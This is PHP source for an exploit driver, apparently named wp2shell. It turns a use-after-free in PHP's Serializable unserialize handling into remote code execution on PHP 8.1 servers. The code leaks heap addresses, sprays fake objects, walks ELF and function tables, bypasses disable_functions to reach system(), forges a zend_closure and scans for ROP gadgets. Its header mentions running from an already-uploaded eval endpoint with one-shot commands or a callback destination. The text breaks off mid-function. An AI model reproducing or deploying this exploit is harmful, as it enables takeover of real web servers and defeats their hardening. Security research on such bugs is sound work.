<?php
/*
 * WP2SHELL ROP DRIVER -- Serializable UAF variant.
 *
 * This file is deliberately separate from the packaged wp2shell exploit. It
 * resolves the live PHP PIE image, gadgets, mprotect(), php_printf(), and
 * _zend_bailout without fixed gadget or symbol offsets. The raw PIC payload is
 * supplied by the Python client in the wpr_pic request field. If that payload
 * returns, the ROP chain restores the heap mapping to RW, prints a completion
 * marker through PHP, then _zend_bailout abandons the corrupted destructor
 * frame cleanly.
 *
 * Expected lab target: PHP 8.1.34 NTS x86_64, either FPM or Apache/mod_php.
 */
/*
 * PHP Serializable shared-var_hash UAF → RCE.
 *
 * Bug: zend_user_unserialize() in Zend/zend_interfaces.c does not increment
 * BG(serialize_lock) before invoking a Serializable class's unserialize()
 * method. A recursive unserialize() call inside that body inherits the
 * outer var_hash; if the body then frees memory the inner parse registered
 * (e.g. by growing an inner stdClass's property table past nTableSize=8),
 * outer R:N back-references resolve to freed slots.
 *
 * Gadget: one statement.
 *
 *     unserialize($data)->x = 0;
 *
 * Inner payload: O:8:"stdClass":8:{...}. Eight inner properties fill the
 * property HT to nTableSize=8; the single ->x = 0 write is the 9th insert
 * and triggers the 8→16 resize, which efree's the original 288-byte arData
 * buffer. Var_hash slots 4..11 (the 8 property zvals) all point into it.
 *
 * Chain: heap leak → spray Closures → mega-string scan for zend_object gc
 * patterns → find function_table HT → resolve system() (via standard
 * module's static zend_function_entry[] when disable_functions blocks it)
 * → fake zend_closure → IS_OBJECT type confusion → RCE.
 *
 * Target: PHP 8.0–8.5 (NTS). Verified on x86_64 and aarch64.
 * Pointer-validity bounds and the EG-from-handlers scan range are
 * auto-tuned per architecture at startup.
 */

/*
 * Web dispatcher adaptation for wp2shell.py.
 *
 * Upstream source:
 * https://raw.githubusercontent.com/califio/publications/refs/heads/main/MADBugs/php/local_exploit.php
 *
 * The Serializable UAF, handler recovery, and fake-Closure construction remain
 * upstream. For the official PHP 8.1 FPM/CLI binaries, the adaptation adds
 * their negative handler-to-EG layout, internal-function offsets and standard
 * function-entry layout/index, while retaining the positive-distance scan
 * used by the Apache/mod_php lab. If the upstream symbol-table read is not
 * available, a per-request marker plus object-prefix check locates the live
 * fake Closure without selecting stale bytes left in a long-lived worker heap.
 * The fixed CLI command sink is replaced at the final invocation point so an
 * already-uploaded eval endpoint can pass a base64-encoded one-shot command
 * or callback destination without writing this post-exploit to the target
 * filesystem.
 *
 * The upstream file declares PHP 8.0-8.5 support. This packaged adaptation is
 * intentionally pinned by its client to PHP 8.1 NTS because its added binary
 * layout and standard-function-table handling are verified for PHP 8.1.34.
 */

error_reporting(0);

function wp2shell_init_rop_log() {
    if (!isset($_REQUEST['wpr_log']))
        return;
    $path = base64_decode((string) $_REQUEST['wpr_log'], true);
    if (!is_string($path))
        return;
    if (!preg_match('#^/tmp/\.wp2shell-[a-f0-9]{12}\.rop\.log$#D', $path))
        return;
    $GLOBALS['_wp2shell_rop_log_path'] = $path;
    @unlink($path);
    @ob_start();
}

function wp2shell_snapshot_rop_log() {
    $path = $GLOBALS['_wp2shell_rop_log_path'] ?? null;
    if (!is_string($path) || $path === '')
        return;
    $contents = @ob_get_contents();
    if (is_string($contents))
        @file_put_contents($path, $contents, LOCK_EX);
}

wp2shell_init_rop_log();
register_shutdown_function('wp2shell_snapshot_rop_log');

class CachedData implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void {
        unserialize($data)->x = 0;
    }
}

$GLOBALS['_cl'] = function(){};

class Exploit {
    const SPRAY_LEN   = 280;
    const SPRAY_COUNT = 32;
    const NUM_PROPS   = 8;

    // Struct member offsets — stable across PHP 8.0–8.5 builds
    const OFF_OBJ_CE       = 0x10;
    const OFF_OBJ_HANDLERS = 0x18;
    const OFF_CLOSURE_FUNC = 0x38;
    const OFF_HANDLER      = 0x38;   // zend_internal_function.handler (PHP 8.1)
    const OFF_HT_MASK      = 0x0C;
    const OFF_HT_ARDATA    = 0x10;

    // Bucket layout (32 bytes)
    const BUCKET_SIZE = 32;
    const BUCKET_VAL  = 0;
    const BUCKET_H    = 16;
    const BUCKET_KEY  = 24;

    const OFF_INTFUNC_MODULE = 0x40; // zend_internal_function.module (PHP 8.1)
    const OFF_MODULE_FUNCS   = 0x28;
    const FUNC_ENTRY_SIZE    = 0x20; // zend_function_entry (PHP 8.1)

    private $ADDR_MAX;   // user-space pointer upper bound
    private $DELTA_MAX;  // EG-from-closure_handlers scan range

    public function __construct() {
        $arch = php_uname('m');
        if ($arch === 'aarch64' || $arch === 'arm64') {
            // 48-bit user; PIE binaries map in the 0xaaaa.. range, EG..closure_handlers ~0x340
            $this->ADDR_MAX  = 0xFFFFFFFFFFFF;
            $this->DELTA_MAX = 0x600;
        } else {
            // x86_64 / others: 47-bit canonical user; EG..closure_handlers typically <0x300
            $this->ADDR_MAX  = 0x7FFFFFFFFFFF;
            $this->DELTA_MAX = 0x300;
        }
    }

    // ─── Spray builders ───

    private function build_inner() {
        // 8-property stdClass: HT created at nTableSize=8, full to capacity.
        // The gadget body's single ->x = 0 write is the 9th insert and triggers
        // the resize. Slot 3 = stdClass, slots 4..11 = property zvals.
        $props = '';
        for ($k = 0; $k < self::NUM_PROPS; $k++) {
            $pname = "p$k";
            $props .= 's:' . strlen($pname) . ':"' . $pname . '";i:' . (0xAAAA0000 + $k) . ';';
        }
        return 'O:8:"stdClass":' . self::NUM_PROPS . ':{' . $props . '}';
    }

    private function build_spray_islong($marker = 0xBBBB0000) {
        $s = str_repeat("\x00", self::SPRAY_LEN);
        for ($k = 0; $k < 8; $k++) {
            $vo = 8 + $k * 32; $to = $vo + 8;
            if ($to + 4 > self::SPRAY_LEN) break;
            $m = $marker + $k;
            $s[$vo]=chr($m&0xFF); $s[$vo+1]=chr(($m>>8)&0xFF);
            $s[$vo+2]=chr(($m>>16)&0xFF); $s[$vo+3]=chr(($m>>24)&0xFF);
            $s[$vo+4]=$s[$vo+5]=$s[$vo+6]=$s[$vo+7]="\x00";
            $s[$to]="\x04"; $s[$to+1]=$s[$to+2]=$s[$to+3]="\x00";
        }
        return $s;
    }

    private function build_spray_isstring($target_addr) {
        $s = str_repeat("\x00", self::SPRAY_LEN);
        $vo = 8 + 1 * 32;
        $ab = pack('P', $target_addr);
        for ($i = 0; $i < 8; $i++) $s[$vo + $i] = $ab[$i];
        $to = $vo + 8;
        $s[$to] = "\x06"; $s[$to+1] = $s[$to+2] = $s[$to+3] = "\x00";
        for ($k = 0; $k < 8; $k++) {
            if ($k == 1) continue;
            $vo2 = 8 + $k * 32; $to2 = $vo2 + 8;
            if ($to2 + 4 > self::SPRAY_LEN) break;
            $s[$to2] = "\x04"; $s[$to2+1] = $s[$to2+2] = $s[$to2+3] = "\x00";
        }
        return $s;
    }

    private function build_spray_isobject($obj_addr) {
        $s = str_repeat("\x00", self::SPRAY_LEN);
        $vo = 8 + 1 * 32;
        $ab = pack('P', $obj_addr);
        for ($i = 0; $i < 8; $i++) $s[$vo + $i] = $ab[$i];
        $to = $vo + 8;
        $s[$to] = "\x08"; $s[$to+1] = "\x03"; $s[$to+2] = $s[$to+3] = "\x00";
        for ($k = 0; $k < 8; $k++) {
            if ($k == 1) continue;
            $vo2 = 8 + $k * 32; $to2 = $vo2 + 8;
            if ($to2 + 4 > self::SPRAY_LEN) break;
            $s[$to2] = "\x04"; $s[$to2+1] = $s[$to2+2] = $s[$to2+3] = "\x00";
        }
        return $s;
    }

    private function build_spray_isarray($ht_addr) {
        $s = str_repeat("\x00", self::SPRAY_LEN);
        $vo = 8 + 1 * 32;
        $ab = pack('P', $ht_addr);
        for ($i = 0; $i < 8; $i++) $s[$vo + $i] = $ab[$i];
        $to = $vo + 8;
        // IS_ARRAY | IS_TYPE_REFCOUNTED | IS_TYPE_COLLECTABLE.
        $s[$to] = "\x07"; $s[$to+1] = "\x03";
        $s[$to+2] = $s[$to+3] = "\x00";
        for ($k = 0; $k < 8; $k++) {
            if ($k == 1) continue;
            $vo2 = 8 + $k * 32; $to2 = $vo2 + 8;
            if ($to2 + 4 > self::SPRAY_LEN) break;
            $s[$to2] = "\x04";
            $s[$to2+1] = $s[$to2+2] = $s[$to2+3] = "\x00";
        }
        return $s;
    }

    private function build_payload($spray, $num_refs = 1) {
        $inner = $this->build_inner();
        $c_part = 'C:10:"CachedData":' . strlen($inner) . ':{' . $inner . '}';
        $total = 1 + self::SPRAY_COUNT + $num_refs;
        $parts = ['i:0;' . $c_part];
        for ($i = 0; $i < self::SPRAY_COUNT; $i++) {
            $parts[] = 'i:' . ($i + 1) . ';s:' . self::SPRAY_LEN . ':"' . $spray . '";';
        }
        for ($k = 0; $k < $num_refs; $k++) {
            // R:4..R:11 = the 8 property zvals of the inner stdClass
            $parts[] = 'i:' . (self::SPRAY_COUNT + 1 + $k) . ';R:' . (4 + $k) . ';';
        }
        return 'a:' . $total . ':{' . implode('', $parts) . '}';
    }

    // ─── UAF read primitives ───

    private function uaf_read($addr, $n = 8) {
        foreach ([0, 0x08, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200] as $bias) {
            $target = $addr - 0x18 - $bias;
            if ($target < 0x1000) continue;
            $spray = $this->build_spray_isstring($target);
            $payload = $this->build_payload($spray, 1);
            $result = @unserialize($payload);
            if ($result === false) continue;
            $str = $result[self::SPRAY_COUNT + 1];
            if (!is_string($str)) continue;
            $slen = strlen($str);
            if ($slen >= 0 && $slen <= $bias + $n - 1) continue;
            $out = substr($str, $bias, $n);
            if (strlen($out) >= $n) return $out;
        }
        return false;
    }

    private function read8($addr) {
        $d = $this->uaf_read($addr, 8);
        if ($d === false || strlen($d) < 8) return false;
        return unpack('P', $d)[1];
    }

    private function read8_retry($addr, $attempts = 3) {
        for ($i = 0; $i < $attempts; $i++) {
            $v = $this->read8($addr);
            if ($v !== false) return $v;
        }
        return false;
    }

    private function read_memory($addr, $length) {
        $out = '';
        while (strlen($out) < $length) {
            $remaining = $length - strlen($out);
            $want = min(0x8000, $remaining);
            $piece = false;
            while ($want >= 8 && $piece === false) {
                $piece = $this->uaf_read($addr + strlen($out), $want);
                if ($piece === false) $want = intdiv($want, 2);
            }
            if ($piece === false) return false;
            $out .= $piece;
        }
        return substr($out, 0, $length);
    }

    private function u16_at($data, $offset) {
        return unpack('v', substr($data, $offset, 2))[1];
    }

    private function u32_at($data, $offset) {
        return unpack('V', substr($data, $offset, 4))[1];
    }

    private function u64_at($data, $offset) {
        return unpack('P', substr($data, $offset, 8))[1];
    }

    private function enabled_handler($arData, $nTableMask) {
        foreach (['var_dump', 'strlen', 'array_push', 'getenv'] as $name) {
            $bucket = $this->ht_find_raw($arData, $nTableMask, $name);
            if ($bucket === false) continue;
            $func = $this->u64_at($bucket, 0);
            $handler = $this->read8_retry($func + self::OFF_HANDLER);
            if ($handler !== false && $handler >= 0x10000 && $handler <= $this->ADDR_MAX) {
                printf("[+] ELF code anchor (%s): 0x%x\n", $name, $handler);
                return $handler;
            }
        }
        return false;
    }

    private function parse_elf_at($base, $anchor) {
        // uaf_read() needs a readable fake zend_string header immediately
        // before the requested bytes. At a mapping boundary, read from ELF
        // offset 0x18 so that the real ELF header itself supplies those bytes.
        $eh = $this->read_memory($base + 0x18, 40);
        if ($eh === false) return false;
        $entry = $this->u64_at($eh, 0);
        $phoff = $this->u64_at($eh, 8);
        $ehsize = $this->u16_at($eh, 28);
        $phentsize = $this->u16_at($eh, 30);
        $phnum = $this->u16_at($eh, 32);
        // The FPM binary is PIE and has a normal non-zero entry point. Under
        // Apache/mod_php the live PHP image is libphp.so, whose ELF entry point
        // is legitimately zero because it is an ET_DYN shared object.
        if (($entry !== 0 && $entry < 0x1000) || $entry > 0x10000000 || $ehsize !== 64) return false;
        if ($phentsize !== 56 || $phnum < 2 || $phnum > 64 || $phoff > 0x10000) return false;

        $raw = $this->read_memory($base + $phoff, $phentsize * $phnum);
        if ($raw === false) return false;
        $loads = [];
        $exec = [];
        $dynamic = false;
        $anchor_in_exec = false;
        for ($i = 0; $i < $phnum; $i++) {
            $p = substr($raw, $i * $phentsize, $phentsize);
            $type = $this->u32_at($p, 0);
            $flags = $this->u32_at($p, 4);
            $vaddr = $this->u64_at($p, 16);
            $filesz = $this->u64_at($p, 32);
            $memsz = $this->u64_at($p, 40);
            if ($type === 1) {
                $seg = [
                    'address' => $base + $vaddr,
                    'filesz' => $filesz,
                    'memsz' => $memsz,
                    'flags' => $flags,
                ];
                $loads[] = $seg;
                if (($flags & 1) !== 0) {
                    $exec[] = $seg;
                    if ($anchor >= $seg['address'] && $anchor < $seg['address'] + $memsz)
                        $anchor_in_exec = true;
                }
            } elseif ($type === 2) {
                $dynamic = ['address' => $base + $vaddr, 'size' => $memsz];
            }
        }
        if (!$anchor_in_exec || $dynamic === false || empty($exec)) return false;
        return ['base' => $base, 'loads' => $loads, 'exec' => $exec, 'dynamic' => $dynamic];
    }

    private function find_php_elf($anchor) {
        // GNU-linked PHP PIEs use the maximum PT_LOAD alignment for the image
        // base. Probe 2 MiB-aligned candidates and validate every ELF field and
        // the executable segment containing the live handler pointer.
        $candidate = $anchor & ~0x1fffff;
        for ($i = 0; $i < 16; $i++, $candidate -= 0x200000) {
            if ($candidate < 0x10000) break;
            $image = $this->parse_elf_at($candidate, $anchor);
            if ($image !== false) {
                printf("[+] PHP ELF base: 0x%x\n", $candidate);
                return $image;
            }
        }
        return false;
    }

    private function dynamic_tags($image) {
        $address = $image['dynamic']['address'];
        $limit = min($image['dynamic']['size'], 0x4000);
        $raw = $this->read_memory($address, $limit);
        if ($raw === false) return false;
        $tags = [];
        for ($off = 0; $off + 16 <= strlen($raw); $off += 16) {
            $tag = $this->u64_at($raw, $off);
            $value = $this->u64_at($raw, $off + 8);
            if ($tag === 0) break;
            $tags[$tag] = $value;
        }
        foreach ([5, 6, 23] as $tag) {
            if (isset($tags[$tag]) && $tags[$tag] < $image['base'])
                $tags[$tag] += $image['base'];
        }
        return $tags;
    }

    private function dynamic_symbols($image, $tags) {
        if (!isset($tags[5], $tags[6], $tags[10], $tags[11])) return false;
        $strtab = $tags[5];
        $symtab = $tags[6];
        $strsz = $tags[10];
        $syment = $tags[11];
        if ($syment !== 24 || $strtab <= $symtab || $strsz < 1 || $strsz > 0x200000)
            return false;
        $count = intdiv($strtab - $symtab, $syment);
        if ($count < 1 || $count > 20000) return false;
        $symbols = $this->read_memory($symtab, $count * $syment);
        $strings = $this->read_memory($strtab, $strsz);
        if ($symbols === false || $strings === false) return false;
        return ['raw' => $symbols, 'strings' => $strings, 'count' => $count, 'syment' => $syment];
    }

    private function symbol_name($symbols, $index) {
        if ($index < 0 || $index >= $symbols['count']) return false;
        $off = $index * $symbols['syment'];
        $name_off = $this->u32_at($symbols['raw'], $off);
        if ($name_off >= strlen($symbols['strings'])) return false;
        $end = strpos($symbols['strings'], "\x00", $name_off);
        if ($end === false) return false;
        return substr($symbols['strings'], $name_off, $end - $name_off);
    }

    private function resolve_defined_symbol($image, $symbols, $wanted) {
        for ($i = 0; $i < $symbols['count']; $i++) {
            if ($this->symbol_name($symbols, $i) !== $wanted) continue;
            $off = $i * $symbols['syment'];
            $shndx = $this->u16_at($symbols['raw'], $off + 6);
            $value = $this->u64_at($symbols['raw'], $off + 8);
            if ($shndx === 0 || $value === 0) return false;
            return $image['base'] + $value;
        }
        return false;
    }

    private function resolve_jump_slot($image, $tags, $symbols, $wanted) {
        if (!isset($tags[23], $tags[2]) || $tags[2] < 24 || $tags[2] > 0x200000)
            return false;
        $rela = $this->read_memory($tags[23], $tags[2]);
        if ($rela === false) return false;
        for ($off = 0; $off + 24 <= strlen($rela); $off += 24) {
            $r_offset = $this->u64_at($rela, $off);
            $r_info = $this->u64_at($rela, $off + 8);
            $type = $r_info & 0xffffffff;
            $sym_index = $r_info >> 32;
            if ($type !== 7 || $this->symbol_name($symbols, $sym_index) !== $wanted)
                continue;
            $slot = $r_offset < $image['base'] ? $image['base'] + $r_offset : $r_offset;
            return $this->read8_retry($slot);
        }
        return false;
    }

    private function scan_gadgets($image) {
        $patterns = [
            'leave_ret' => "\xc9\xc3",
            'pop_rsp_ret' => "\x5c\xc3",
            'pop_rdi_ret' => "\x5f\xc3",
            'pop_rsi_ret' => "\x5e\xc3",
            'pop_rdx_ret' => "\x5a\xc3",
            'pop_rax_ret' => "\x58\xc3",
            'ret' => "\xc3",
        ];
        $found = array_fill_keys(array_keys($patterns), []);
        foreach ($image['exec'] as $segment) {
            $tail = '';
            // Leave the first 0x18 bytes for the forged zend_string header.
            // No useful multi-instruction gadget is expected in the ELF .init
            // segment prologue, and this avoids reading before a mapping edge.
            for ($offset = 0x18; $offset < $segment['filesz']; $offset += 0x8000) {
                $size = min(0x8000, $segment['filesz'] - $offset);
                $piece = $this->read_memory($segment['address'] + $offset, $size);
                if ($piece === false) return false;
                $scan = $tail . $piece;
                $scan_base = $segment['address'] + $offset - strlen($tail);
                foreach ($patterns as $name => $pattern) {
                    if (count($found[$name]) >= 512) continue;
                    $from = 0;
                    while (($pos = strpos($scan, $pattern, $from)) !== false) {
                        $address = $scan_base + $pos;
                        if (empty($found[$name]) || end($found[$name]) !== $address)
                            $found[$name][] = $address;
                        if (count($found[$name]) >= 512) break;
                        $from = $pos + 1;
                    }
                }
                $tail = substr($scan, -1);
            }
        }

        $gadgets = [];
        foreach ($found as $name => $addresses) {
            if ($name === 'pop_rsp_ret') {
                // This address also occupies HashTable.u.flags. zend_hash_destroy
                // requires the packed/static bits to remain clear before calling
                // pDestructor.
                $addresses = array_values(array_filter(
                    $addresses,
                    fn($address) => ($address & 0x14) === 0
                ));
            }
            if (empty($addresses)) return false;
            $gadgets[$name] = $addresses[0];
            printf("[+] Gadget %-11s 0x%x (ELF+0x%x)\n",
                $name, $addresses[0], $addresses[0] - $image['base']);
        }
        return $gadgets;
    }

    // ─── DJBX33A hash (same as Zend) ───

    private function zend_hash_func($key) {
        $h = 5381;
        for ($i = 0; $i < strlen($key); $i++)
            $h = (($h << 5) + $h) + ord($key[$i]);
        return $h | (1 << 63);
    }

    private function ht_find($ht_addr, $key) {
        $arData = $this->read8_retry($ht_addr + self::OFF_HT_ARDATA);
        if ($arData === false) return false;
        $d = $this->uaf_read($ht_addr + self::OFF_HT_MASK, 4);
        if ($d === false) return false;
        $nTableMask = unpack('V', $d)[1];
        return $this->ht_find_raw($arData, $nTableMask, $key);
    }

    private function ht_find_raw($arData, $nTableMask, $key) {
        $h = $this->zend_hash_func($key);
        $nIndex = (($h & 0xFFFFFFFF) | $nTableMask) & 0xFFFFFFFF;
        if ($nIndex >= 0x80000000) $nIndex -= 0x100000000;

        $slot_addr = $arData + $nIndex * 4;
        $d = $this->uaf_read($slot_addr, 4);
        if ($d === false) return false;
        $idx = unpack('V', $d)[1];
        if ($idx === 0xFFFFFFFF) return false;

        $klen = strlen($key);
        for ($chain = 0; $chain < 16; $chain++) {
            $bucket_addr = $arData + $idx * self::BUCKET_SIZE;
            $bucket = $this->uaf_read($bucket_addr, self::BUCKET_SIZE);
            if ($bucket === false) return false;
            $key_ptr = unpack('P', substr($bucket, self::BUCKET_KEY, 8))[1];
            if ($key_ptr != 0) {
                $kd = $this->uaf_read($key_ptr + 16, 8 + $klen);
                if ($kd !== false) {
                    $slen = unpack('P', substr($kd, 0, 8))[1];
                    if ($slen == $klen && substr($kd, 8, $klen) === $key) {
                        return $bucket;
                    }
                }
            }
            $next = unpack('V', substr($bucket, 12, 4))[1];
            if ($next === 0xFFFFFFFF) return false;
            $idx = $next;
        }
        return false;
    }

    // ─── Phase 1: Heap address leak ───

    private function heap_leak() {
        $spray = $this->build_spray_islong();
        $original = $spray;
        $payload = $this->build_payload($spray, self::NUM_PROPS);
        $result = @unserialize($payload);
        if ($result === false) die("[-] heap_leak: unserialize failed\n");

        for ($i = 1; $i <= self::SPRAY_COUNT; $i++) {
            $s = $result[$i];
            for ($k = 0; $k < self::NUM_PROPS; $k++) {
                $vo = 8 + ($k + 1) * 32;
                if (substr($s, $vo, 8) !== substr($original, $vo, 8)) {
                    return unpack('P', substr($s, $vo, 8))[1];
                }
            }
        }
        die("[-] heap_leak: no spray modification detected\n");
    }

    // ─── Phase 2: Find object pointers (ce, handlers) from heap objects ───

    private function find_object_pointers($heap_addr) {
        $chunk = $heap_addr & 0xFFFFFFFFFFE00000;

        for ($i = 0; $i < 256; $i++) {
            $GLOBALS["_spray_$i"] = function(){};
        }

        for ($attempt = 0; $attempt < 3; $attempt++) {
            $target = $chunk - 0x10;
            $spray = $this->build_spray_isstring($target);
            $payload = $this->build_payload($spray, 1);
            $result = @unserialize($payload);
            if ($result === false) continue;
            $str = $result[self::SPRAY_COUNT + 1];
            if (!is_string($str)) continue;
            $slen = strlen($str);
            if ($slen < 0x10000) continue;

            $max_off = min($slen, 0x200000 - 0x08);

            $pairs = [];
            for ($off = 8; $off + 32 <= $max_off; $off += 16) {
                $rc = unpack('V', substr($str, $off, 4))[1];
                if ($rc < 1 || $rc > 50) continue;
                $ti = ord($str[$off + 4]) & 0x0F;
                if ($ti != 8) continue;
                $handle = unpack('V', substr($str, $off + 8, 4))[1];
                if ($handle == 0 || $handle > 100000) continue;
                $pad = unpack('V', substr($str, $off + 12, 4))[1];
                if ($pad != 0) continue;
                $ce = unpack('P', substr($str, $off + 16, 8))[1];
                $handlers = unpack('P', substr($str, $off + 24, 8))[1];
                if ($ce == 0 || $handlers == 0) continue;
                if (($handlers & (~0x1FFFFF)) == $chunk) continue;
                if ($handlers < 0x10000 || $handlers > $this->ADDR_MAX) continue;
                $key = sprintf("%x", $handlers);
                if (!isset($pairs[$key])) $pairs[$key] = ['ce' => $ce, 'handlers' => $handlers, 'count' => 0];
                $pairs[$key]['count']++;
            }

            if (empty($pairs)) continue;

            usort($pairs, fn($a, $b) => $b['count'] <=> $a['count']);
            $best = $pairs[0];
            printf("[+] Closure group: %d objects\n", $best['count']);
            printf("[+] Class entry: 0x%x\n", $best['ce']);
            printf("[+] Handlers: 0x%x\n", $best['handlers']);
            return [$best['ce'], $best['handlers']];
        }
        return false;
    }

    // ─── Phase 3a: Find EG and function_table near handlers in .bss ───

    private function find_function_table_ht($handlers, $heap_addr) {
        // Some linked SAPI binaries place executor_globals before, rather than
        // shortly after, closure_handlers. Try that observed layout first,
        // then retain the upstream positive-distance scan.
        $deltas = [-0x1de0];
        for ($delta = 0x20; $delta < $this->DELTA_MAX; $delta += 8)
            $deltas[] = $delta;

        foreach ($deltas as $delta) {
            foreach ([0x1b0, 0x1c8] as $ft_off) {
                $ptr_addr = $handlers + $delta + $ft_off;
                $d = $this->uaf_read($ptr_addr, 24);
                if ($d === false) continue;

                $ft_ptr = unpack('P', substr($d, 0, 8))[1];
                $ct_ptr = unpack('P', substr($d, 8, 8))[1];
                $zc_ptr = unpack('P', substr($d, 16, 8))[1];

                if ($ft_ptr < 0x10000 || $ft_ptr > $this->ADDR_MAX) continue;
                if ($ct_ptr < 0x10000 || $ct_ptr > $this->ADDR_MAX) continue;
                if ($zc_ptr < 0x10000 || $zc_ptr > $this->ADDR_MAX) continue;
                if (abs($ft_ptr - $ct_ptr) > 0x1000000) continue;
                if (abs($ct_ptr - $zc_ptr) > 0x1000000) continue;

                $htd = $this->uaf_read($ft_ptr + self::OFF_HT_MASK, 16);
                if ($htd === false) continue;

                $nTableMask = unpack('V', substr($htd, 0, 4))[1];
                $arData = unpack('P', substr($htd, 4, 8))[1];
                $nNumUsed = unpack('V', substr($htd, 12, 4))[1];

                $pos = (~$nTableMask + 1) & 0xFFFFFFFF;
                if ($pos < 64 || ($pos & ($pos - 1)) != 0) continue;
                if ($arData < 0x10000 || $arData > $this->ADDR_MAX) continue;
                if ($nNumUsed < 100 || $nNumUsed > 10000) continue;

                printf("[+] Function table: 0x%x\n", $ft_ptr);
                printf("[+] Function entries: %d\n", $nNumUsed);
                return ['ht' => $ft_ptr, 'arData' => $arData, 'nTableMask' => $nTableMask,
                        'delta' => $delta, 'ft_off' => $ft_off];
            }
        }
        return false;
    }

    // ─── Phase 3b: Find symbol_table (embedded in EG) ───

    private function find_symbol_table($handlers, $combined, $heap_addr) {
        foreach ([0x1b0, 0x1c8] as $ft_off) {
            $delta = $combined - $ft_off;
            if ($delta < 0) continue;
            $eg = $handlers + $delta;
            $st = $eg + 0x130;

            $d = false;
            for ($attempt = 0; $attempt < 5 && $d === false; $attempt++)
                $d = $this->uaf_read($st + self::OFF_HT_MASK, 16);
            if ($d === false) continue;

            $st_mask = unpack('V', substr($d, 0, 4))[1];
            $st_ardata = unpack('P', substr($d, 4, 8))[1];
            $st_nused = unpack('V', substr($d, 12, 4))[1];

            $m32 = $st_mask & 0xFFFFFFFF;
            if ($m32 < 0xFFFF0000) continue;
            $pos = (~$m32 + 1) & 0xFFFFFFFF;
            if (($pos & ($pos - 1)) !== 0 || $pos < 4) continue;
            if ($st_ardata < 0x10000) continue;
            if ($st_nused > 500) continue;

            printf("[+] Executor globals: 0x%x\n", $eg);
            printf("[+] Symbol table: 0x%x\n", $st);
            return $st;
        }
        return false;
    }

    private function read_str($addr, $maxlen = 32) {
        $d = $this->uaf_read($addr, $maxlen);
        if ($d === false) return false;
        $s = '';
        for ($i = 0; $i < strlen($d); $i++) {
            $c = ord($d[$i]);
            if ($c == 0) break;
            if ($c >= 0x20 && $c <= 0x7e) $s .= chr($c);
            else return false;
        }
        return $s;
    }

    // ─── Phase 4: Bypass disable_functions, find zif_system handler ───

    private function find_system($arData, $nTableMask, $closure_handlers) {
        $disabled = ini_get('disable_functions');
        $is_disabled = (stripos($disabled, 'system') !== false);

        if (!$is_disabled) {
            $bucket = $this->ht_find_raw($arData, $nTableMask, "system");
            if ($bucket !== false) {
                $func_ptr = unpack('P', substr($bucket, 0, 8))[1];
                $handler = $this->read8_retry($func_ptr + self::OFF_HANDLER);
                if ($handler !== false) {
                    printf("[+] system handler: 0x%x\n", $handler);
                    return ['handler' => $handler, 'mode' => 'closure'];
                }
            }
        }

        echo "[+] system() is disabled\n";
        echo "[*] Recovering the internal handler\n";

        $handler = $this->find_system_via_module($arData, $nTableMask);
        if ($handler === false)
            die("[-] Internal system handler not found\n");

        printf("[+] system handler: 0x%x\n", $handler);
        return ['handler' => $handler, 'mode' => 'closure'];
    }

    private function find_system_via_module($arData, $nTableMask) {
        $probe_funcs = ['var_dump', 'array_push', 'phpversion', 'getenv', 'strtolower'];
        $mod_ptr = false;

        foreach ($probe_funcs as $fname) {
            $bucket = $this->ht_find_raw($arData, $nTableMask, $fname);
            if ($bucket === false) continue;
            $func_ptr = unpack('P', substr($bucket, 0, 8))[1];
            $candidate = $this->read8_retry($func_ptr + self::OFF_INTFUNC_MODULE);
            if ($candidate === false || $candidate < 0x10000 || $candidate > $this->ADDR_MAX)
                continue;

            $name_ptr = $this->read8_retry($candidate + 0x20);
            if ($name_ptr === false) continue;
            $name = $this->read_str($name_ptr, 16);
            if ($name === 'standard') {
                $mod_ptr = $candidate;
                printf("[+] Standard module found via %s\n", $fname);
                break;
            }
        }

        if ($mod_ptr === false) return false;

        $funcs = $this->read8_retry($mod_ptr + self::OFF_MODULE_FUNCS);
        if ($funcs === false) return false;

        if (PHP_VERSION_ID >= 80100 && PHP_VERSION_ID < 80200) {
            // PHP 8.1 standard/basic_functions.c entry order.
            $entry = $funcs + 278 * self::FUNC_ENTRY_SIZE;
            $handler = $this->read8_retry($entry + 0x08);
            if (
                $handler !== false
                && $handler >= 0x10000
                && $handler <= $this->ADDR_MAX
                && abs($handler - $funcs) <= 0x2000000
            ) {
                echo "[+] PHP 8.1 system entry found\n";
                return $handler;
            }
        }

        for ($j = 0; $j < 600; $j++) {
            $entry = $funcs + $j * self::FUNC_ENTRY_SIZE;
            $fname_ptr = $this->read8_retry($entry);
            if ($fname_ptr === false) continue;
            if ($fname_ptr == 0) break;
            if (
                $fname_ptr < 0x10000
                || $fname_ptr > $this->ADDR_MAX
                || abs($fname_ptr - $funcs) > 0x2000000
            ) continue;
            $fname = $this->read_str($fname_ptr, 16);
            if ($fname === 'system') {
                $handler = $this->read8_retry($entry + 0x08);
                if (
                    $handler !== false
                    && $handler >= 0x10000
                    && $handler <= $this->ADDR_MAX
                    && abs($handler - $funcs) <= 0x2000000
                ) return $handler;
            }
        }
        return false;
    }

    // ─── Build fake zend_closure ───

    private function build_fake_closure($ce, $handlers, $system_handler) {
        $b = str_repeat("\x00", 512);
        $w = function(&$buf, $off, $data) {
            for ($i = 0; $i < strlen($data); $i++) $buf[$off + $i] = $data[$i];
        };

        $w($b, 0x00, pack('V', 0x7FFFFFFF));
        $w($b, 0x04, pack('V', 0x18));
        $w($b, self::OFF_OBJ_CE, pack('P', $ce));
        $w($b, self::OFF_OBJ_HANDLERS, pack('P', $handlers));
        $w($b, self::OFF_CLOSURE_FUNC, chr(1));
        $w($b, 0x58, pack('V', 1));
        $w($b, 0x5C, pack('V', 1));
        $w($b, self::OFF_CLOSURE_FUNC + self::OFF_HANDLER, pack('P', $system_handler));

        return $b;
    }

    private function find_var_string_addr($st_addr, $name) {
        $bucket = $this->ht_find($st_addr, $name);
        if ($bucket === false) return false;

        $type = ord($bucket[8]);
        $val  = unpack('P', substr($bucket, 0, 8))[1];

        if ($type == 6) return $val;
        if ($type == 10) {
            $inner = $this->uaf_read($val + 8, 16);
            if ($inner === false) return false;
            if (ord($inner[8]) == 6) return unpack('P', substr($inner, 0, 8))[1];
        }
        return false;
    }

    private function find_bytes_in_heap(
        $heap_addr,
        $needle,
        $relative_offset = 0,
        $expected_prefix = ''
    ) {
        $chunk = $heap_addr & 0xFFFFFFFFFFE00000;

        for ($attempt = 0; $attempt < 3; $attempt++) {
            $target = $chunk - 0x10;
            $spray = $this->build_spray_isstring($target);
            $payload = $this->build_payload($spray, 1);
            $result = @unserialize($payload);
